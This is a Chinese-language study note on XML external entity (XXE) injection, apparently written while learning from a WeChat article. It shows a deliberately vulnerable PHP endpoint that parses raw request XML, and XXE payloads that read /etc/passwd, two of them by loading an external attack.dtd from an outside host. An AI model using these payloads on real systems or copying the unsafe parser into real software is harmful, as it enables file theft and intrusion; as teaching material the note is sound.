# XML实体注入漏洞攻与防 笔记


# 参考：

继续看松牛的文章学习新姿势。

[XML实体注入漏洞攻与防
](http://mp.weixin.qq.com/s/0eyuG3zEWluAD9v7qvw8PQ)

---

# XML基础

XML是一种用于标记电子文件使其具有结构性的**标记语言**，可以用来标记数据、定义数据类型，是一种允许用户**对自己的标记语言进行定义的源语言**。

XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。


当从打印输出读取或以电子形式处理文档时，元素能够帮助更好地理解文档。**元素的描述性越强，文档各部分越容易识别**。自从出现标记至今，带有标记的内容就有一个优势，即在计算机系统缺失时，仍然可以通过标记理解打印出来数据。

> xml跟json格式的数据一样，都是便于传输的数据的格式。相似之处在于json键值对对应得很明确而xml每个数据都有标签标记着。

# XML实体注入基础

简单了解XML以后，我们知道要在XML中使用**特殊字符**，需要使用**实体字符**，也可以将一些可能多次会用到的短语(比如公司名称)设置为实体，然后就可以在内容中使用。

如下就声明了一个名为coname值为QiHoo 360的实体。
`<!DOCTYPE UserData [ <!ENTITY coname "QiHoo 360"> ]>`

要在XML中使用实体，使用`&coname;`即可。


## 危害：
当允许引用外部实体时，通过构造恶意内容，可导致

- 读取任意文件
- 执行系统命令
- 探测内网端口
- 攻击内网网站

等危害。

## 简单的漏洞环境

```
<?php


$xml = file_get_contents("php://input");
$data = simplexml_load_string($xml);

foreach ($data as $key => $value){
    echo "您的" . translate($key)."是".$value."<br>";
}

function translate($str){
    switch ($str){
        case "name":
            return "名字";
        case "wechat":
            return "微信";
        case "public_wechat":
            return "微信公众号";
        case "website":
            return "网站";
    }
}

```

假设这里我们希望用户输入的是：


```
<?xml version="1.0" encoding="utf-8" ?>
<user>
	<name>Jerry</name>
	<wechat>tom</wechat>
	<public_wechat>haha</public_wechat>
	<website>www.xxx.com</website>
</user>
```

然后就可以返回如下页面：

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fia0by5npzj30qq0o6gp3.jpg)


# XML实体注入漏洞的几种姿势
方法1：

`<!DOCTYPE a [ <!ENTITY b SYSTEM "file:///etc/passwd"> ]>`

方法2：

`<!DOCTYPE a [ <!ENTITY %d SYSTEM "http://www.hackersb.cn/attack.dtd"> %d; ]>`


方法3：
`<!DOCTYPE a SYSTEM "http://www.hackersb.cn/attack.dtd">`


其中attack.dtd的内容为：

`<!ENTITY b SYSTEM "file:///etc/passwd">`

## 读取本地任意文件
利用xml实体注入我们可以读取本地任意文件。

读取任意文件的思路大概就是**引入一个实体**，**实体内容为本地文件**。

构造payload如下：

```
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE a [ <!ENTITY b SYSTEM "file:///etc/passwd"> ]>
<user>
	<name>Jerry</name>
	<wechat>tom</wechat>
	<public_wechat>haha</public_wechat>
	<website>www.xxx.com</website>
</user>

```

